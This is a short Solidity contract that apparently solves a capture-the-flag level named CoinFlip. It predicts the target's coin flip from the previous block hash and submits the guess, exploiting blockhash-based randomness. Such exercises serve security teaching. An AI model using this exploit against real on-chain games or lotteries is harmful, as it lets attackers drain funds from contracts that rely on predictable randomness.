pragma solidity ^0.8.0;

contract CoinFlipBreaker {

    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {}

    function callFlip(address task_addr) external {

        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlip task_contract = CoinFlip(task_addr);
        task_contract.flip(side);
    }

    function transfer() public payable {}

}

abstract contract CoinFlip {
    function flip(bool _guess) virtual public returns (bool);
}